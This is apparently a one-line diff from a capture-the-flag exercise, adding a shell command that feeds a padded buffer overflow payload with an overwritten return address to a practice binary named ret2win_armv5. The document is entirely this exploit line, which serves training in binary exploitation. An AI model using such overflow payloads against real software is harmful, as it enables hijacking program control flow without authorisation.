@@ -1,0 +1,1 @@
+echo -n -e 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xfc\x05\x01\x00' | ./ret2win_armv5
